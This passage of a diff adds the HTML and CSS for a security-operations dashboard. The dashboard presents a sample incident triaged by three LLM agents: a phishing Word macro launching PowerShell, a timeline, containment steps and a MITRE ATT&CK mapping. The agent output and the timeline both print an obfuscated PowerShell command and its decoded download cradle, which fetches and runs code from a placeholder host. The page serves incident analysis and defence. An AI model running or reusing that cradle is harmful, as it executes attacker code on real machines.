@@ -1,0 +1,1532 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Agentic SOC — Multi-Agent Incident Analysis Dashboard</title>
+  <meta name="description" content="Autonomous Agentic Security Operations Center (SOC) Multi-Agent LLM Incident Analysis Dashboard">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Outfit:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg-darkest: #07090e;
+      --bg-darker: #0d111a;
+      --bg-card: rgba(18, 24, 38, 0.75);
+      --bg-card-hover: rgba(26, 34, 52, 0.85);
+      --bg-card-solid: #121826;
+      --border-subtle: rgba(70, 90, 130, 0.2);
+      --border-glow: rgba(0, 229, 255, 0.35);
+      
+      --color-cyan: #00f0ff;
+      --color-cyan-glow: rgba(0, 240, 255, 0.15);
+      --color-red: #ff3366;
+      --color-red-glow: rgba(255, 51, 102, 0.2);
+      --color-amber: #ffb800;
+      --color-amber-glow: rgba(255, 184, 0, 0.15);
+      --color-green: #00e676;
+      --color-green-glow: rgba(0, 230, 118, 0.15);
+      --color-purple: #a855f7;
+      --color-blue: #3b82f6;
+
+      --text-primary: #f1f5f9;
+      --text-secondary: #94a3b8;
+      --text-muted: #64748b;
+
+      --font-display: 'Outfit', sans-serif;
+      --font-body: 'Inter', sans-serif;
+      --font-mono: 'JetBrains Mono', monospace;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background-color: var(--bg-darkest);
+      background-image: 
+        radial-gradient(circle at 15% 15%, rgba(0, 240, 255, 0.05) 0%, transparent 40%),
+        radial-gradient(circle at 85% 25%, rgba(255, 51, 102, 0.06) 0%, transparent 45%),
+        linear-gradient(to bottom, #07090e, #0c101a);
+      color: var(--text-primary);
+      font-family: var(--font-body);
+      min-height: 100vh;
+      line-height: 1.5;
+      padding: 1.5rem;
+    }
+
+    /* Container */
+    .dashboard-container {
+      max-width: 1400px;
+      margin: 0 auto;
+      display: flex;
+      flex-direction: column;
+      gap: 1.75rem;
+    }
+
+    /* Top Navigation / Header */
+    header.dashboard-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 1.25rem;
+      padding: 1.25rem 1.75rem;
+      background: var(--bg-card);
+      border: 1px solid var(--border-subtle);
+      border-radius: 16px;
+      backdrop-filter: blur(16px);
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+    }
+
+    .brand-icon {
+      width: 46px;
+      height: 46px;
+      border-radius: 12px;
+      background: linear-gradient(135deg, rgba(0, 240, 255, 0.2), rgba(255, 51, 102, 0.2));
+      border: 1px solid var(--border-glow);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.6rem;
+      box-shadow: 0 0 20px var(--color-cyan-glow);
+    }
+
+    .brand-title h1 {
+      font-family: var(--font-display);
+      font-size: 1.4rem;
+      font-weight: 800;
+      letter-spacing: -0.02em;
+      background: linear-gradient(120deg, #ffffff, #cbd5e1);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .brand-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.4rem;
+      font-size: 0.72rem;
+      font-family: var(--font-mono);
+      color: var(--color-cyan);
+      background: rgba(0, 240, 255, 0.08);
+      padding: 0.2rem 0.6rem;
+      border-radius: 20px;
+      border: 1px solid rgba(0, 240, 255, 0.3);
+      font-weight: 600;
+    }
+
+    .pulse-dot {
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      background: var(--color-green);
+      box-shadow: 0 0 10px var(--color-green);
+      animation: pulse 2s infinite ease-in-out;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.4; transform: scale(0.8); }
+    }
+
+    .header-actions {
+      display: flex;
+      align-items: center;
+      gap: 0.85rem;
+      flex-wrap: wrap;
+    }
+
+    .btn {
+      font-family: var(--font-display);
+      font-weight: 600;
+      font-size: 0.88rem;
+      padding: 0.65rem 1.25rem;
+      border-radius: 10px;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+      transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1);
+      border: 1px solid transparent;
+      text-decoration: none;
+    }
+
+    .btn-secondary {
+      background: rgba(30, 41, 59, 0.7);
+      color: var(--text-primary);
+      border-color: rgba(148, 163, 184, 0.2);
+    }
+
+    .btn-secondary:hover {
+      background: rgba(51, 65, 85, 0.9);
+      border-color: rgba(148, 163, 184, 0.4);
+      transform: translateY(-1px);
+    }
+
+    .btn-primary {
+      background: linear-gradient(135deg, #00f0ff, #0099ff);
+      color: #07090e;
+      border-color: #00f0ff;
+      box-shadow: 0 0 20px rgba(0, 240, 255, 0.35);
+    }
+
+    .btn-primary:hover {
+      box-shadow: 0 0 28px rgba(0, 240, 255, 0.6);
+      transform: translateY(-1px);
+    }
+
+    .btn-primary:active {
+      transform: translateY(0);
+    }
+
+    /* Grid Layout */
+    .dashboard-grid {
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 1.5rem;
+    }
+
+    @media (min-width: 1024px) {
+      .grid-2-col {
+        grid-template-columns: 2fr 1fr;
+      }
+      .grid-3-col {
+        grid-template-columns: repeat(3, 1fr);
+      }
+    }
+
+    /* Cards */
+    .card {
+      background: var(--bg-card);
+      border: 1px solid var(--border-subtle);
+      border-radius: 16px;
+      padding: 1.5rem;
+      backdrop-filter: blur(16px);
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.25);
+      transition: border-color 0.2s ease, box-shadow 0.2s ease;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .card:hover {
+      border-color: rgba(70, 90, 130, 0.4);
+    }
+
+    .card-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 1.25rem;
+    }
+
+    .card-title {
+      font-family: var(--font-display);
+      font-size: 1.15rem;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      gap: 0.6rem;
+      color: var(--text-primary);
+    }
+
+    .card-subtitle {
+      font-size: 0.8rem;
+      color: var(--text-muted);
+      font-family: var(--font-mono);
+    }
+
+    /* Hero Incident Verdict Banner */
+    .verdict-hero {
+      background: linear-gradient(135deg, rgba(255, 51, 102, 0.12) 0%, rgba(18, 24, 38, 0.85) 60%);
+      border: 1px solid rgba(255, 51, 102, 0.35);
+      box-shadow: 0 10px 40px rgba(255, 51, 102, 0.15);
+      border-radius: 18px;
+      padding: 2rem;
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 1.75rem;
+    }
+
+    @media (min-width: 900px) {
+      .verdict-hero {
+        grid-template-columns: 340px 1fr;
+        align-items: center;
+      }
+    }
+
+    .verdict-badge-box {
+      background: rgba(10, 12, 18, 0.8);
+      border: 1px solid rgba(255, 51, 102, 0.4);
+      border-radius: 14px;
+      padding: 1.5rem;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 0.75rem;
+      box-shadow: inset 0 0 20px rgba(255, 51, 102, 0.1);
+    }
+
+    .verdict-tag {
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      letter-spacing: 0.15em;
+      text-transform: uppercase;
+      color: var(--text-secondary);
+    }
+
+    .verdict-status {
+      font-family: var(--font-display);
+      font-size: 2.2rem;
+      font-weight: 800;
+      color: var(--color-red);
+      text-shadow: 0 0 25px rgba(255, 51, 102, 0.7);
+      letter-spacing: -0.01em;
+    }
+
+    .confidence-meter {
+      width: 100%;
+      background: rgba(30, 41, 59, 0.8);
+      height: 8px;
+      border-radius: 6px;
+      overflow: hidden;
+      margin-top: 0.25rem;
+    }
+
+    .confidence-bar {
+      height: 100%;
+      background: linear-gradient(90deg, #ff8a00, #ff3366);
+      width: 98%;
+      box-shadow: 0 0 10px rgba(255, 51, 102, 0.8);
+    }
+
+    .confidence-label {
+      font-size: 0.8rem;
+      font-family: var(--font-mono);
+      color: var(--text-secondary);
+      display: flex;
+      justify-content: space-between;
+      width: 100%;
+    }
+
+    .verdict-summary h2 {
+      font-family: var(--font-display);
+      font-size: 1.35rem;
+      font-weight: 700;
+      margin-bottom: 0.5rem;
+      color: #fff;
+    }
+
+    .verdict-summary p {
+      font-size: 0.95rem;
+      color: #cbd5e1;
+      line-height: 1.65;
+    }
+
+    .root-cause-box {
+      margin-top: 1rem;
+      padding: 0.9rem 1.1rem;
+      background: rgba(255, 184, 0, 0.08);
+      border-left: 3px solid var(--color-amber);
+      border-radius: 0 8px 8px 0;
+      font-size: 0.88rem;
+      color: #fef08a;
+    }
+
+    .root-cause-box strong {
+      color: var(--color-amber);
+    }
+
+    /* 3-Agent Collaborative Pipeline Visualizer */
+    .pipeline-wrapper {
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 1rem;
+    }
+
+    @media (min-width: 850px) {
+      .pipeline-wrapper {
+        grid-template-columns: repeat(3, 1fr);
+      }
+    }
+
+    .pipeline-step {
+      background: rgba(15, 23, 42, 0.7);
+      border: 1px solid var(--border-subtle);
+      border-radius: 12px;
+      padding: 1.25rem;
+      display: flex;
+      flex-direction: column;
+      gap: 0.75rem;
+      position: relative;
+    }
+
+    .pipeline-step.active {
+      border-color: var(--border-glow);
+      background: rgba(0, 240, 255, 0.04);
+      box-shadow: 0 0 20px rgba(0, 240, 255, 0.1);
+    }
+
+    .step-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .step-title {
+      font-family: var(--font-display);
+      font-weight: 700;
+      font-size: 0.95rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .step-badge {
+      font-family: var(--font-mono);
+      font-size: 0.68rem;
+      font-weight: 700;
+      padding: 0.2rem 0.5rem;
+      border-radius: 20px;
+      background: rgba(0, 230, 118, 0.12);
+      color: var(--color-green);
+      border: 1px solid rgba(0, 230, 118, 0.3);
+    }
+
+    .step-desc {
+      font-size: 0.82rem;
+      color: var(--text-secondary);
+      line-height: 1.45;
+    }
+
+    .step-output {
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      background: rgba(5, 7, 12, 0.8);
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      border-radius: 8px;
+      padding: 0.6rem 0.75rem;
+      color: #38bdf8;
+      overflow-x: auto;
+      white-space: pre-wrap;
+    }
+
+    /* Attack Timeline */
+    .timeline {
+      display: flex;
+      flex-direction: column;
+      gap: 1rem;
+      position: relative;
+      margin-left: 0.75rem;
+    }
+
+    .timeline::before {
+      content: '';
+      position: absolute;
+      top: 10px;
+      bottom: 10px;
+      left: 17px;
+      width: 2px;
+      background: linear-gradient(to bottom, var(--color-cyan), var(--color-red), var(--color-purple));
+      opacity: 0.3;
+    }
+
+    .timeline-item {
+      display: flex;
+      gap: 1.25rem;
+      position: relative;
+      transition: transform 0.2s ease;
+    }
+
+    .timeline-item:hover {
+      transform: translateX(4px);
+    }
+
+    .timeline-icon {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      background: #0f172a;
+      border: 2px solid var(--color-cyan);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.95rem;
+      flex-shrink: 0;
+      z-index: 2;
+      box-shadow: 0 0 12px var(--color-cyan-glow);
+    }
+
+    .timeline-icon.red {
+      border-color: var(--color-red);
+      box-shadow: 0 0 12px var(--color-red-glow);
+    }
+
+    .timeline-icon.amber {
+      border-color: var(--color-amber);
+      box-shadow: 0 0 12px var(--color-amber-glow);
+    }
+
+    .timeline-content {
+      background: rgba(15, 23, 42, 0.6);
+      border: 1px solid var(--border-subtle);
+      border-radius: 12px;
+      padding: 1rem 1.25rem;
+      flex-grow: 1;
+    }
+
+    .timeline-meta {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 0.4rem;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+    }
+
+    .timeline-time {
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      color: var(--color-cyan);
+      font-weight: 600;
+    }
+
+    .timeline-type-pill {
+      font-family: var(--font-mono);
+      font-size: 0.68rem;
+      padding: 0.15rem 0.5rem;
+      border-radius: 12px;
+      background: rgba(255, 255, 255, 0.06);
+      color: var(--text-secondary);
+      text-transform: uppercase;
+      font-weight: 700;
+    }
+
+    .timeline-text {
+      font-size: 0.88rem;
+      color: #e2e8f0;
+      margin-bottom: 0.5rem;
+    }
+
+    .timeline-code {
+      font-family: var(--font-mono);
+      font-size: 0.74rem;
+      background: rgba(2, 6, 23, 0.85);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 6px;
+      padding: 0.5rem 0.75rem;
+      color: #38bdf8;
+      overflow-x: auto;
+    }
+
+    /* MITRE ATT&CK Matrix Grid */
+    .mitre-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+      gap: 0.85rem;
+    }
+
+    .mitre-card {
+      background: rgba(15, 23, 42, 0.75);
+      border: 1px solid var(--border-subtle);
+      border-radius: 10px;
+      padding: 1rem;
+      display: flex;
+      flex-direction: column;
+      gap: 0.5rem;
+      transition: all 0.2s ease;
+    }
+
+    .mitre-card:hover {
+      border-color: rgba(59, 130, 246, 0.4);
+      background: rgba(30, 41, 59, 0.6);
+      transform: translateY(-2px);
+    }
+
+    .mitre-tactic-pill {
+      font-family: var(--font-mono);
+      font-size: 0.68rem;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      color: #93c5fd;
+      font-weight: 700;
+    }
+
+    .mitre-tech-name {
+      font-family: var(--font-display);
+      font-weight: 700;
+      font-size: 0.95rem;
+      color: #f8fafc;
+    }
+
+    .mitre-tech-id {
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      color: var(--color-amber);
+      font-weight: 600;
+      text-decoration: none;
+      display: inline-flex;
+      align-items: center;
+      gap: 0.3rem;
+    }
+
+    .mitre-tech-id:hover {
+      text-decoration: underline;
+    }
+
+    /* IOC & Affected Entities */
+    .entities-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+      gap: 1rem;
+    }
+
+    .entity-group {
+      background: rgba(15, 23, 42, 0.6);
+      border: 1px solid var(--border-subtle);
+      border-radius: 12px;
+      padding: 1.1rem;
+    }
+
+    .entity-label {
+      font-size: 0.75rem;
+      font-family: var(--font-mono);
+      text-transform: uppercase;
+      color: var(--text-muted);
+      margin-bottom: 0.6rem;
+      display: flex;
+      align-items: center;
+      gap: 0.4rem;
+    }
+
+    .entity-tags {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+    }
+
+    .tag-item {
+      font-family: var(--font-mono);
+      font-size: 0.8rem;
+      padding: 0.3rem 0.65rem;
+      border-radius: 6px;
+      display: inline-flex;
+      align-items: center;
+      gap: 0.4rem;
+      background: rgba(30, 41, 59, 0.8);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      color: var(--text-primary);
+    }
+
+    .tag-item.danger {
+      background: rgba(255, 51, 102, 0.12);
+      border-color: rgba(255, 51, 102, 0.3);
+      color: #fda4af;
+    }
+
+    .tag-item.warning {
+      background: rgba(255, 184, 0, 0.12);
+      border-color: rgba(255, 184, 0, 0.3);
+      color: #fef08a;
+    }
+
+    /* Tactical Containment Checklist */
+    .checklist-progress-bar {
+      width: 100%;
+      height: 6px;
+      background: rgba(30, 41, 59, 0.8);
+      border-radius: 4px;
+      overflow: hidden;
+      margin-bottom: 1.25rem;
+    }
+
+    .checklist-progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, #00f0ff, #00e676);
+      width: 0%;
+      transition: width 0.3s ease;
+    }
+
+    .checklist-items {
+      display: flex;
+      flex-direction: column;
+      gap: 0.75rem;
+    }
+
+    .checklist-item {
+      background: rgba(15, 23, 42, 0.6);
+      border: 1px solid var(--border-subtle);
+      border-radius: 10px;
+      padding: 0.9rem 1.1rem;
+      display: flex;
+      align-items: flex-start;
+      gap: 0.85rem;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    .checklist-item:hover {
+      background: rgba(30, 41, 59, 0.6);
+      border-color: rgba(0, 240, 255, 0.3);
+    }
+
+    .checklist-item.completed {
+      opacity: 0.6;
+      border-color: rgba(0, 230, 118, 0.3);
+      background: rgba(0, 230, 118, 0.05);
+    }
+
+    .checklist-item.completed span {
+      text-decoration: line-through;
+      color: var(--text-muted);
+    }
+
+    .checklist-checkbox {
+      width: 18px;
+      height: 18px;
+      border-radius: 4px;
+      border: 1.5px solid var(--color-cyan);
+      background: transparent;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-top: 2px;
+      flex-shrink: 0;
+      transition: all 0.2s ease;
+    }
+
+    .checklist-item.completed .checklist-checkbox {
+      background: var(--color-green);
+      border-color: var(--color-green);
+    }
+
+    .checklist-checkbox::after {
+      content: '✓';
+      font-size: 11px;
+      color: #07090e;
+      font-weight: 800;
+      display: none;
+    }
+
+    .checklist-item.completed .checklist-checkbox::after {
+      display: block;
+    }
+
+    .checklist-text {
+      font-size: 0.88rem;
+      color: #e2e8f0;
+      line-height: 1.5;
+    }
+
+    /* Raw JSON Toggle / Drawer */
+    .raw-json-box {
+      background: #05070d;
+      border: 1px solid var(--border-subtle);
+      border-radius: 10px;
+      padding: 1rem;
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      max-height: 380px;
+      overflow: auto;
+      color: #94a3b8;
+      white-space: pre-wrap;
+    }
+
+    /* Modal / Toast */
+    .toast {
+      position: fixed;
+      bottom: 2rem;
+      right: 2rem;
+      background: rgba(18, 24, 38, 0.95);
+      border: 1px solid var(--color-cyan);
+      border-radius: 10px;
+      padding: 0.9rem 1.4rem;
+      color: #fff;
+      font-family: var(--font-display);
+      font-weight: 600;
+      font-size: 0.9rem;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
+      transform: translateY(100px);
+      opacity: 0;
+      transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+      z-index: 999;
+      display: flex;
+      align-items: center;
+      gap: 0.6rem;
+    }
+
+    .toast.show {
+      transform: translateY(0);
+      opacity: 1;
+    }
+
+    /* Spinner */
+    .spinner {
+      width: 16px;
+      height: 16px;
+      border: 2px solid rgba(7, 9, 14, 0.3);
+      border-top-color: #07090e;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      display: none;
+    }
+
+    .btn.loading .spinner {
+      display: inline-block;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="dashboard-container">
+    
+    <!-- Top Header -->
+    <header class="dashboard-header" id="dashboard-header">
+      <div class="brand">
+        <div class="brand-icon">🛡️</div>
+        <div class="brand-title">
+          <h1>AGENTIC SOC</h1>
+          <div class="brand-badge">
+            <span class="pulse-dot"></span>
+            <span>MULTI-AGENT LLM INCIDENT ENGINE</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="header-actions">
+        <input type="file" id="file-input" accept=".json" style="display: none;">
+        <button class="btn btn-secondary" id="btn-upload-file">
+          <span>📂</span>
+          <span>Load Incident JSON</span>
+        </button>
+        <button class="btn btn-secondary" id="btn-sample-data">
+          <span>🔄</span>
+          <span>Sample Incident</span>
+        </button>
+        <button class="btn btn-primary" id="btn-run-analysis">
+          <div class="spinner" id="run-spinner"></div>
+          <span id="btn-run-text">⚡ Run Multi-Agent Analysis</span>
+        </button>
+      </div>
+    </header>
+
+    <!-- Incident Info Ribbon -->
+    <section style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 1rem; padding: 0.2rem 0.5rem;">
+      <div style="display: flex; align-items: center; gap: 1rem; flex-wrap: wrap;">
+        <span style="font-family: var(--font-mono); font-size: 0.82rem; color: var(--color-cyan);" id="ribbon-incident-id">INCIDENT: INC-2026-9812</span>
+        <span style="color: var(--text-muted);">•</span>
+        <span style="font-size: 0.85rem; color: var(--text-secondary);" id="ribbon-rule-name">Rule: PowerShell.ObfuscatedPayload.ExternalSocket</span>
+        <span style="color: var(--text-muted);">•</span>
+        <span style="font-size: 0.82rem; color: var(--text-muted);" id="ribbon-timestamp">Timestamp: 2026-10-06 22:45:00 UTC</span>
+      </div>
+      <div style="font-family: var(--font-mono); font-size: 0.75rem; color: var(--text-secondary);" id="ribbon-model-info">
+        MODEL: <span style="color: #38bdf8;">Gemini 3.5 Flash Lite</span> (Active)
+      </div>
+    </section>
+
+    <!-- Hero Verdict Banner -->
+    <section class="verdict-hero" id="verdict-hero">
+      <div class="verdict-badge-box">
+        <span class="verdict-tag">AUTHORITATIVE VERDICT</span>
+        <div class="verdict-status" id="verdict-text">MALICIOUS</div>
+        <div class="confidence-meter">
+          <div class="confidence-bar" id="confidence-bar" style="width: 98%;"></div>
+        </div>
+        <div class="confidence-label">
+          <span>Confidence</span>
+          <strong id="confidence-val" style="color: #fff;">98.0%</strong>
+        </div>
+        <div style="margin-top: 0.4rem; font-family: var(--font-mono); font-size: 0.75rem; color: var(--color-red); font-weight: 700;" id="severity-badge">
+          SEVERITY: CRITICAL
+        </div>
+      </div>
+
+      <div class="verdict-summary">
+        <h2>Executive Summary & Incident Verdict</h2>
+        <p id="executive-summary-text">
+          On October 6, 2026, host FINANCE-DESKTOP-04 suffered a confirmed compromise driven by a weaponized macro-enabled Microsoft Word document (Invoice_Q3.docm) opened by user corp\aditya. The document executed an obfuscated PowerShell download cradle (PID 5820) which retrieved and executed a secondary payload from 'malicious.site' (IP: 198.51.100.23). Following initial execution, the attacker performed local discovery via whoami.exe (PID 5910) and successfully established an outbound C2 TLS connection over port 443. Immediate containment and isolation are mandatory.
+        </p>
+        <div class="root-cause-box" id="root-cause-box">
+          <strong>Initial Execution Vector & Root Cause:</strong>
+          <span id="root-cause-text">User opened a malicious macro-enabled Microsoft Word document (Invoice_Q3.docm) downloaded from the internet, which spawned an encoded PowerShell cradle that fetched external C2 while performing privilege discovery.</span>
+        </div>
+      </div>
+    </section>
+
+    <!-- 3-Agent Collaborative Pipeline Visualizer -->
+    <section class="card" id="pipeline-section">
+      <div class="card-header">
+        <div class="card-title">
+          <span>🤖</span>
+          <span>Collaborative 3-Agent Pipeline Execution</span>
+        </div>
+        <div class="card-subtitle">SEQUENTIAL MULTI-AGENT HANDOFF</div>
+      </div>
+
+      <div class="pipeline-wrapper">
+        <!-- Agent 1 -->
+        <div class="pipeline-step active" id="agent-step-1">
+          <div class="step-header">
+            <div class="step-title">
+              <span>🕵️</span>
+              <span>1. Forensic Investigator</span>
+            </div>
+            <span class="step-badge">COMPLETED</span>
+          </div>
+          <div class="step-desc">
+            Decoded Base64 PowerShell cradle and reconstructed parent-child process execution tree from flagged logs.
+          </div>
+          <div class="step-output" id="agent-1-output">
+Decoded Payload:
+IEX (New-Object Net.WebClient).DownloadString('https://malicious.site/beacon')
+Parent PID 4120 -> Child PID 5820
+          </div>
+        </div>
+
+        <!-- Agent 2 -->
+        <div class="pipeline-step active" id="agent-step-2">
+          <div class="step-header">
+            <div class="step-title">
+              <span>🎯</span>
+              <span>2. Threat & MITRE Analyst</span>
+            </div>
+            <span class="step-badge">COMPLETED</span>
+          </div>
+          <div class="step-desc">
+            Correlated execution events with MITRE ATT&CK Matrix; assessed adversary intent & calculated blast radius.
+          </div>
+          <div class="step-output" id="agent-2-output">
+Mapped 6 ATT&CK Techniques:
+T1566.001 (Phishing), T1059.001 (PowerShell),
+T1027 (Obfuscation), T1071.001 (C2)
+Adversary: Commodity Loader / C2 Beacon
+          </div>
+        </div>
+
+        <!-- Agent 3 -->
+        <div class="pipeline-step active" id="agent-step-3">
+          <div class="step-header">
+            <div class="step-title">
+              <span>🛡️</span>
+              <span>3. Incident Commander</span>
+            </div>
+            <span class="step-badge">COMPLETED</span>
+          </div>
+          <div class="step-desc">
+            Formulated authoritative verdict, synthesized executive narrative, and issued 5 containment directives.
+          </div>
+          <div class="step-output" id="agent-3-output">
+Verdict: MALICIOUS (98% Conf)
+Prioritized Containment:
+[1] Isolate FINANCE-DESKTOP-04
+[2] Terminate PIDs 4120, 5820, 5910
+[3] Block 198.51.100.23 & sinkhole
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Main Two Column Section: Timeline & Tactical Checklist -->
+    <div class="dashboard-grid grid-2-col">
+      
+      <!-- Left Column: Attack Timeline -->
+      <section class="card" id="timeline-section">
+        <div class="card-header">
+          <div class="card-title">
+            <span>⏱️</span>
+            <span>Reconstructed Attack Timeline</span>
+          </div>
+          <div class="card-subtitle" id="timeline-count">4 SEQUENTIAL EVENTS</div>
+        </div>
+
+        <div class="timeline" id="timeline-container">
+          <!-- Timeline Item 1 -->
+          <div class="timeline-item">
+            <div class="timeline-icon">📁</div>
+            <div class="timeline-content">
+              <div class="timeline-meta">
+                <span class="timeline-time">22:45:00 UTC</span>
+                <span class="timeline-type-pill">FILE / EXECUTION</span>
+              </div>
+              <div class="timeline-text">User opened malicious macro-enabled Word document (Invoice_Q3.docm).</div>
+              <div class="timeline-code">"C:\Program Files\Microsoft Office\WINWORD.EXE" "C:\Users\aditya\Downloads\Invoice_Q3.docm"</div>
+            </div>
+          </div>
+
+          <!-- Timeline Item 2 -->
+          <div class="timeline-item">
+            <div class="timeline-icon red">⚡</div>
+            <div class="timeline-content">
+              <div class="timeline-meta">
+                <span class="timeline-time">22:45:08 UTC</span>
+                <span class="timeline-type-pill">PROCESS (PID 5820)</span>
+              </div>
+              <div class="timeline-text">WINWORD.EXE spawned obfuscated PowerShell executing remote web download cradle.</div>
+              <div class="timeline-code">powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3... (Decoded: IEX (New-Object Net.WebClient).DownloadString('https://malicious.site/beacon'))</div>
+            </div>
+          </div>
+
+          <!-- Timeline Item 3 -->
+          <div class="timeline-item">
+            <div class="timeline-icon amber">🔍</div>
+            <div class="timeline-content">
+              <div class="timeline-meta">
+                <span class="timeline-time">22:45:18 UTC</span>
+                <span class="timeline-type-pill">DISCOVERY (PID 5910)</span>
+              </div>
+              <div class="timeline-text">PowerShell spawned whoami.exe to discover user privileges and security groups.</div>
+              <div class="timeline-code">whoami /priv /groups</div>
+            </div>
+          </div>
+
+          <!-- Timeline Item 4 -->
+          <div class="timeline-item">
+            <div class="timeline-icon red">🌐</div>
+            <div class="timeline-content">
+              <div class="timeline-meta">
+                <span class="timeline-time">22:45:30 UTC</span>
+                <span class="timeline-type-pill">NETWORK C2</span>
+              </div>
+              <div class="timeline-text">PowerShell established outbound TLS connection to external C2 server over TCP/443.</div>
+              <div class="timeline-code">TCP 10.0.12.88 -> 198.51.100.23:443 (Domain: malicious.site)</div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- Right Column: Tactical Remediation Checklist -->
+      <section class="card" id="remediation-section">
+        <div class="card-header">
+          <div class="card-title">
+            <span>🚨</span>
+            <span>Remediation Checklist</span>
+          </div>
+          <div class="card-subtitle" id="checklist-counter">0 OF 5 COMPLETED</div>
+        </div>
+
+        <div class="checklist-progress-bar">
+          <div class="checklist-progress-fill" id="checklist-progress"></div>
+        </div>
+
+        <div class="checklist-items" id="checklist-container">
+          <div class="checklist-item" onclick="toggleChecklistItem(this)">
+            <div class="checklist-checkbox"></div>
+            <div class="checklist-text"><strong>Immediate Host Isolation:</strong> Isolate FINANCE-DESKTOP-04 from the corporate network immediately to halt C2 beaconing.</div>
+          </div>
+          <div class="checklist-item" onclick="toggleChecklistItem(this)">
+            <div class="checklist-checkbox"></div>
+            <div class="checklist-text"><strong>Terminate Process Tree:</strong> Force-kill malicious processes WINWORD.EXE (4120), powershell.exe (5820), and whoami.exe (5910).</div>
+          </div>
+          <div class="checklist-item" onclick="toggleChecklistItem(this)">
+            <div class="checklist-checkbox"></div>
+            <div class="checklist-text"><strong>Perimeter Blocking:</strong> Add firewall drop rule for IP 198.51.100.23 and sinkhole malicious domain 'malicious.site' in internal DNS.</div>
+          </div>
+          <div class="checklist-item" onclick="toggleChecklistItem(this)">
+            <div class="checklist-checkbox"></div>
+            <div class="checklist-text"><strong>Credential Invalidation:</strong> Force password reset and revoke active Kerberos tokens for compromised user account corp\aditya.</div>
+          </div>
+          <div class="checklist-item" onclick="toggleChecklistItem(this)">
+            <div class="checklist-checkbox"></div>
+            <div class="checklist-text"><strong>Forensic Acquisition:</strong> Acquire disk and memory dumps from FINANCE-DESKTOP-04 to inspect for secondary persistence mechanisms.</div>
+          </div>
+        </div>
+      </section>
+
+    </div>
+
+    <!-- MITRE ATT&CK Matrix Grid -->
+    <section class="card" id="mitre-section">
+      <div class="card-header">
+        <div class="card-title">
+          <span>🏷️</span>
+          <span>MITRE ATT&CK Framework Mapping</span>
+        </div>
+        <div class="card-subtitle">ENTERPRISE MATRIX TACTICS & TECHNIQUES</div>
+      </div>
+
+      <div class="mitre-grid" id="mitre-grid-container">
+        <div class="mitre-card">
+          <div class="mitre-tactic-pill">Initial Access</div>
+          <div class="mitre-tech-name">Phishing: Spearphishing Attachment</div>
+          <a class="mitre-tech-id" href="https://attack.mitre.org/techniques/T1566/001/" target="_blank" rel="noopener">T1566.001 ↗</a>
+        </div>
+        <div class="mitre-card">
+          <div class="mitre-tactic-pill">Execution</div>
+          <div class="mitre-tech-name">User Execution: Malicious File</div>
+          <a class="mitre-tech-id" href="https://attack.mitre.org/techniques/T1204/002/" target="_blank" rel="noopener">T1204.002 ↗</a>
+        </div>
